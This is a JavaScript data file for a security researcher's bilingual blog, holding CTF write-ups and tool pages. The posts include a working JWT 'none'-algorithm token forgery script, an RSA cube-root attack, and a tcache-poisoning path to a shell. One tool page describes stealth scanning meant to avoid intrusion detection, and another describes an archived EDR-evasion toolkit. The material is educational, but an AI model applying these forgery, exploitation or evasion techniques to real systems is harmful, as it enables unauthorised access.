/* ============================================================
   DATA
   ============================================================ */

window.DATA = (function () {

  const posts = [
    {
      slug: 'jwt-none-bypass',
      title: 'Bypassing JWT authentication via the "none" algorithm',
      date: '2026-03-22',
      category: 'web',
      difficulty: 'easy',
      //ctf: 'YamiCTF 2026',
      tags: ['jwt', 'auth'],
      excerpt: 'A classic JWT misconfiguration. Full authentication bypass on a banking challenge.',
      content: `
        <p>This was a banking application that required authentication via a JSON Web Token. After registering as a normal user, the token contained a standard payload with a <code>role</code> claim set to <code>user</code>.</p>

        <h2>Initial recon</h2>
        <p>The first thing I always do when I see a JWT is decode it and inspect the header:</p>
        <pre><code>{
  "alg": "HS256",
  "typ": "JWT"
}</code></pre>
        <p>Standard HMAC-SHA256. But the application was built with an older version of <code>jsonwebtoken</code>, which historically accepted the <code>none</code> algorithm without complaint.</p>

        <h2>The exploit</h2>
        <p>Crafting a forged token is straightforward. Modify the header to use <code>none</code>, change the role claim to <code>admin</code>, and leave the signature empty:</p>
        <pre><code>import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=")

payload = base64.urlsafe_b64encode(
    json.dumps({"sub":"attacker","role":"admin"}).encode()
).rstrip(b"=")

token = header + b"." + payload + b"."
print(token.decode())</code></pre>

        <h2>Result</h2>
        <p>Sending this token in the <code>Authorization</code> header granted admin access to the dashboard, where the flag was sitting in plain text.</p>

        <blockquote><p>Always pin your JWT library to a recent version and explicitly whitelist the algorithms you accept.</p></blockquote>
      `
    },
    {
      slug: 'rsa-small-exponent',
      title: 'RSA with a tiny public exponent',
      date: '2026-03-10',
      category: 'crypto',
      difficulty: 'medium',
      tags: ['rsa', 'crypto'],
      excerpt: 'When the message is small and the public exponent is even smaller, no padding means no protection.',
      content: `
        <p>The challenge gave us an RSA public key and a ciphertext. The catch: <code>e = 3</code> and the message was a short ASCII string with no padding scheme applied.</p>

        <h2>Why this breaks</h2>
        <p>RSA encryption is <code>c = m^e mod n</code>. When <code>m^e</code> is smaller than <code>n</code>, the modulus operation does nothing — you can simply take the integer cube root of the ciphertext to recover the message.</p>

        <h2>Solution</h2>
        <pre><code>from Crypto.Util.number import long_to_bytes
from gmpy2 import iroot

c = 0x4d3c...  # ciphertext
m, exact = iroot(c, 3)
assert exact
print(long_to_bytes(int(m)))</code></pre>

        <p>Always use a proper padding scheme such as OAEP. Textbook RSA is for textbooks only.</p>
      `
    },
    {
      slug: 'heap-overflow-libc',
      title: 'Heap overflow into tcache: from UAF to RCE',
      date: '2026-02-28',
      category: 'pwn',
      difficulty: 'hard',
      tags: ['heap', 'tcache', 'pwn'],
      excerpt: 'A tcache poisoning attack on a vulnerable note-taking binary running glibc 2.31.',
      content: `
        <p>The binary was a typical note manager: create, edit, delete, view. The vulnerability was a classic use-after-free in the delete function — the chunk pointer was never zeroed out.</p>

        <h2>Tcache poisoning</h2>
        <p>On glibc 2.31, the tcache uses a singly-linked list with a key check but no full safe-linking yet. By freeing two chunks of the same size, we can edit the freed chunk's <code>fd</code> pointer to redirect the next allocation:</p>

        <pre><code># Freed chunks layout
chunk_a -> chunk_b -> NULL

# After UAF edit on chunk_a's fd
chunk_a -> &__free_hook -> garbage</code></pre>

        <h2>Hijacking control flow</h2>
        <p>Two more allocations of the same size, and the second one returns a pointer to <code>__free_hook</code>. Writing the address of <code>system</code> there, then triggering a free on a chunk containing <code>"/bin/sh"</code>, gives a shell.</p>
      `
    },
    {
      slug: 'reversing-custom-vm',
      title: 'Reversing a custom bytecode VM',
      date: '2026-02-14',
      category: 'reverse',
      difficulty: 'hard',
      tags: ['vm', 'reverse'],
      excerpt: 'Building a disassembler from scratch for a virtualised challenge.',
      content: `
        <p>Loading the binary in Ghidra revealed a giant <code>switch</code> statement in <code>main</code> — a classic sign of a bytecode interpreter. The opcodes were encoded as a single byte, with operands following inline.</p>

        <h2>Recovering the ISA</h2>
        <p>I worked through each case, naming them by effect:</p>
        <ul>
          <li><code>0x01 PUSH imm</code> — push immediate</li>
          <li><code>0x02 POP reg</code> — pop into register</li>
          <li><code>0x10 ADD</code> — add top two stack values</li>
          <li><code>0x20 XOR</code> — xor top two stack values</li>
          <li><code>0xFF HALT</code></li>
        </ul>

        <h2>Building the disassembler</h2>
        <pre><code>def disasm(code):
    pc = 0
    while pc < len(code):
        op = code[pc]
        if op == 0x01:
            print(f"{pc:04x}  PUSH {code[pc+1]}")
            pc += 2
        elif op == 0x10:
            print(f"{pc:04x}  ADD")
            pc += 1
        else:
            print(f"{pc:04x}  ??? ({op:02x})")
            pc += 1</code></pre>

        <p>Running this on the embedded bytecode revealed a simple XOR-based check against a hardcoded key. Inverting it gave the flag.</p>
      `
    }
  ];

  const projects = [
    {
      slug: 'kage',
      name: 'kage',
      tagline: 'Async port and service scanner.',
      status: 'active',
      year: '2025',
      stack: 'Rust · Tokio',
      license: 'MIT',
      desc: 'Async port and service scanner. Low-noise recon with adaptive rate limiting.',
      link: 'https://github.com/yami-net/kage',
      content: `
        <p><em>kage</em> is an asynchronous network scanner written in Rust. It was built to solve one problem: running large-scale reconnaissance without tripping every IDS on the way.</p>

        <h2>Why another scanner</h2>
        <p>Most scanners are either fast and loud (nmap at default settings) or slow and dependent on external coordination. I wanted something that would adapt its rate to the target network in real time, back off when it detected resistance, and surface a clean report at the end.</p>

        <h2>Features</h2>
        <ul>
          <li>Fully async I/O on top of Tokio, capable of tens of thousands of concurrent connections per host</li>
          <li>Adaptive rate limiting that responds to RST floods and connection-refused feedback</li>
          <li>Service fingerprinting via banner grabbing, with a small plugin system for custom probes</li>
          <li>Output as JSON, CSV, or human-readable tables</li>
        </ul>

        <h2>Installation</h2>
        <pre><code>cargo install kage
# or
git clone https://github.com/yami-net/kage
cd kage && cargo build --release</code></pre>

        <h2>Basic usage</h2>
        <pre><code># scan a single host, top 1000 ports
kage scan 10.0.0.1

# scan a CIDR range, JSON output
kage scan 10.0.0.0/24 --output json > results.json

# stealth mode (aggressive backoff)
kage scan example.com --profile stealth</code></pre>

        <h2>Design notes</h2>
        <p>The core scheduler uses a token-bucket rate limiter per target, with a feedback loop that reduces the refill rate whenever connection errors spike. This is nothing new — it's classic TCP congestion control applied to scanning — but it makes a surprising difference in how the scan feels from the other side.</p>
      `
    },
    {
      slug: 'onibi',
      name: 'onibi',
      tagline: 'Coverage-guided HTTP fuzzer.',
      status: 'active',
      year: '2025',
      stack: 'Go · AFL++',
      license: 'Apache-2.0',
      desc: 'Coverage-guided mutation fuzzer for REST and GraphQL APIs.',
      link: 'https://github.com/yami-net/onibi',
      content: `
        <p><em>onibi</em> is a mutation fuzzer for HTTP APIs — REST, GraphQL, and anything that roughly fits a request/response shape. It borrows coverage feedback ideas from AFL++ and applies them to the network layer.</p>

        <h2>Why</h2>
        <p>API fuzzing tools tend to fall into two camps: schema-based generators that stay inside the spec, and dumb mutators that generate noise. onibi tries to sit in the middle by using response-based coverage signals (status codes, error strings, latency shifts) as a proxy for branch coverage.</p>

        <h2>What it does</h2>
        <ul>
          <li>Replays a seed corpus of known-good requests, then mutates them field by field</li>
          <li>Tracks a coverage signature derived from response shape, not just status</li>
          <li>Handles authentication flows (bearer tokens, session cookies, OAuth refresh)</li>
          <li>Runs differential checks between two endpoints — useful for catching migration bugs</li>
        </ul>

        <h2>Quick start</h2>
        <pre><code># install
go install github.com/yami-net/onibi/cmd/onibi@latest

# run against an OpenAPI spec
onibi fuzz --spec openapi.yaml --base https://api.example.com

# with auth
onibi fuzz --spec openapi.yaml \\
  --base https://api.example.com \\
  --auth "Bearer $TOKEN"</code></pre>

        <p>The tool is still young and the mutation strategies are deliberately simple. Pull requests welcome.</p>
      `
    },
    {
      slug: 'shuriken',
      name: 'shuriken',
      tagline: 'Self-hosted CTF platform.',
      status: 'stable',
      year: '2024',
      stack: 'Python · Kubernetes',
      license: 'AGPL-3.0',
      desc: 'Self-hosted CTF platform with per-team container isolation and dynamic flag rotation.',
      link: 'https://github.com/yami-net/shuriken',
      content: `
        <p><em>shuriken</em> is the CTF platform I wrote because every existing option forced a tradeoff I didn't want to make. It runs on Kubernetes, isolates each team in their own namespace, and rotates flags on a schedule so that leaked answers don't persist.</p>

        <h2>Core features</h2>
        <ul>
          <li>Per-team container isolation via Kubernetes namespaces — a compromised challenge affects only the team that compromised it</li>
          <li>Dynamic flag rotation on a configurable interval, with grace periods for in-flight submissions</li>
          <li>Automatic writeup publishing from a git repo once a challenge is marked solved network-wide</li>
          <li>Scoring with decay, first-blood bonuses, and optional dynamic difficulty adjustment</li>
        </ul>

        <h2>Architecture</h2>
        <p>The platform has three main components: a Django admin backend, a challenge controller that manages pod lifecycle, and a frontend served as a static site. All challenge communication goes through short-lived ingress rules managed by the controller.</p>

        <h2>Deploying</h2>
        <pre><code># requires helm 3.x and a k8s cluster
helm repo add shuriken https://yami-net.github.io/shuriken
helm install my-ctf shuriken/shuriken \\
  --set domain=ctf.example.com \\
  --set admin.email=you@example.com</code></pre>

        <p>Used for YamiCTF 2024, 2025, and 2026. Stable, boring, does its job.</p>
      `
    },
    {
      slug: 'yurei',
      name: 'yurei',
      tagline: 'Polymorphic shellcode research toolkit.',
      status: 'archived',
      year: '2023',
      stack: 'C · asm',
      license: 'MIT',
      desc: 'Polymorphic shellcode research toolkit. Superseded by newer EDR bypass research.',
      link: 'https://github.com/yami-net/yurei',
      content: `
        <p><em>yurei</em> was a research toolkit exploring runtime polymorphism for educational red-team engagements. It is no longer maintained — the techniques it demonstrates have been thoroughly covered by modern EDR vendors, and keeping it up to date would require more work than the research value justifies.</p>

        <h2>What it explored</h2>
        <ul>
          <li>Runtime instruction substitution using a small x86-64 assembler backend</li>
          <li>Encrypted payload staging with per-execution key derivation</li>
          <li>Sandbox detection via timing and environmental fingerprinting</li>
        </ul>

        <h2>Why it's archived</h2>
        <p>When I started this in 2022, runtime polymorphism was still a useful pedagogical tool for understanding how static signatures fail. By 2024, the industry had moved on to behavioural detection, and yurei's techniques became more of a historical artifact than a useful teaching aid.</p>

        <p>The repository remains online for anyone reading about the history of evasion research. Do not use it for anything that matters.</p>
      `
    }
  ];

  const i18n = {
    en: {
      nav_home: 'Writing',
      nav_projects: 'Projects',
      nav_about: 'About',

      intro_title: 'Hi, I\u2019m Kasumi.',
      intro_p1: 'I\u2019m an independent security researcher based in Tokyo. I break things, then write about why they broke \u2014 mostly web applications, binaries, and the occasional cryptography mishap.',
      intro_p2: 'I publish writeups from CTF competitions and small pieces of vulnerability research here. Everything is released openly. No tracking. No newsletter.',

      section_writing: 'Writing',
      section_projects: 'Projects',

      filter_all: 'all',
      filter_web: 'web',
      filter_crypto: 'crypto',
      filter_pwn: 'pwn',
      filter_reverse: 'reverse',
      filter_lab: 'Filter:',

      no_posts: 'No posts in this category.',
      back: '\u2190 Back',
      back_projects: '\u2190 Projects',

      project_status: 'Status',
      project_year: 'Year',
      project_stack: 'Stack',
      project_license: 'License',
      project_source: 'View on GitHub \u2192',
      status_active: 'active',
      status_stable: 'stable',
      status_archived: 'archived',

      about_title: 'About',
      about_p1: 'I\u2019m Kasumi. I work as an independent security researcher and consultant. My day job is helping fintech and infrastructure teams design systems that are secure by default. My nights and weekends are spent on CTF challenges and writing.',
      about_p2: 'I\u2019ve been interested in how software breaks since I was a teenager, and I\u2019ve been lucky enough to turn that into a living. Most of my work sits at the intersection of web security, binary exploitation, and applied cryptography.',
      about_p3: 'If you want to get in touch about research, consulting, or just to share an interesting bug, my email is below.',

      c_location: 'Location',
      c_focus: 'Focus',
      c_email: 'Email',
      c_pgp: 'PGP',
      c_github: 'GitHub',
      c_location_v: 'Every part of the internet world',
      c_focus_v: 'web, pwn, crypto, reverse',
    },
    ja: {
      nav_home: '記事',
      nav_projects: '作品',
      nav_about: '紹介',

      intro_title: 'こんにちは、霞です。',
      intro_p1: '東京を拠点とする独立系セキュリティ研究者です。物を壊して、なぜ壊れたかを書く \u2014 主にWebアプリケーション、バイナリ、たまに暗号の話題を扱います。',
      intro_p2: 'CTFの解説や小さな脆弱性研究をここで公開しています。全て公開、追跡なし、ニュースレターなし。',

      section_writing: '記事',
      section_projects: '作品',

      filter_all: '全て',
      filter_web: 'web',
      filter_crypto: '暗号',
      filter_pwn: 'pwn',
      filter_reverse: 'リバース',
      filter_lab: '絞り込み:',

      no_posts: 'このカテゴリには記事がありません。',
      back: '\u2190 戻る',
      back_projects: '\u2190 作品一覧',

      project_status: '状態',
      project_year: '年',
      project_stack: '技術',
      project_license: 'ライセンス',
      project_source: 'GitHubで見る \u2192',
      status_active: '開発中',
      status_stable: '安定',
      status_archived: 'アーカイブ',

      about_title: '紹介',
      about_p1: '霞です。独立系セキュリティ研究者およびコンサルタントとして活動しています。本業はフィンテックやインフラのチーム向けにセキュアなシステム設計を支援すること。夜と週末はCTFと執筆に使っています。',
      about_p2: '10代の頃からソフトウェアがどう壊れるかに興味を持ち、それを仕事にできる幸運に恵まれました。活動の中心はWebセキュリティ、バイナリエクスプロイト、応用暗号の交差点にあります。',
      about_p3: '研究、コンサルティング、あるいは面白いバグの話をしたい場合は、下記メールまでどうぞ。',

      c_location: '所在地',
      c_focus: '専門',
      c_email: 'メール',
      c_pgp: 'PGP',
      c_github: 'GitHub',
      c_location_v: 'インターネットの世界のあらゆる部分',
      c_focus_v: 'web, pwn, 暗号, リバース',
    }
  };

  return { posts, projects, i18n };
})();
